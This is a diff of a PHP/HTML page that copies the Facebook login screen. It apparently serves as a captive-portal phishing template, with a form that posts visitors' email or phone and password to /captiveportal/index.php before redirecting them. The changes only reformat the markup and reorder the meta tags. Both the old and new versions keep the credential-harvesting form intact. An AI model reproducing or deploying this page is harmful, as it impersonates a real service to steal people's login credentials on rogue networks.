@@ -3,13 +3,20 @@ $destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
 require_once('helper.php');
 ?>
 
-  <html class=''>
+<html>
 
   <head>
+
     <title>Facebook - Log In</title>
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-    <meta http-equiv="Pragma" content="no-cache" />
-    <meta http-equiv="Expires" content="0" />
+
+    <meta charset='UTF-8'>
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta name="viewport" content="width=device-width, initial-scale=0.75">
+    <meta name="robots" content="noindex, nofollow">
+
+    <script src="jquery-2.2.1.min.js"></script>
     <script type="text/javascript">
       function redirect() {
         setTimeout(function() {
@@ -17,14 +24,13 @@ require_once('helper.php');
         }, 100);
       }
     </script>
-    <meta charset='UTF-8'>
-    <meta name="viewport" content="width=device-width, initial-scale=0.75">
-    <meta name="robots" content="noindex">
-    <script src="jquery-2.2.1.min.js"></script>
+
     <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
     <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
     <link rel="icon" type="image/png" href="assets/img/fm5arwc28y.png"/>
+
     <style class="cp-pen-styles">
+
       * {
         -webkit-box-sizing: border-box;
         -moz-box-sizing: border-box;
@@ -154,21 +160,24 @@ require_once('helper.php');
   </head>
 
   <body>
+
     <section class="login-form-wrap">
+
       <h1>facebook</h1>
-      <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
-          <input type="hidden" name="target" value="<?=$destination?>">
-        <label>
-          <input type="text" name="email" required placeholder="Email or Phone">
-        </label>
-        <label>
-          <input type="password" name="password" required placeholder="Password">
-        </label>
-        <input type="submit" value="Log In">
-      </form>
+
+        <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
+
+            <input type="hidden" name="target" value="<?=$destination?>">
+            <label><input type="text" name="email" required placeholder="Email or Phone"></label>
+            <label><input type="password" name="password" required placeholder="Password"></label>
+            <input type="submit" value="Log In">
+              
+        </form>
+
       <h5><a href="#">Forgot account?</a></h5>
+
     </section>
 
   </body>
 
-  </html>
+</html>
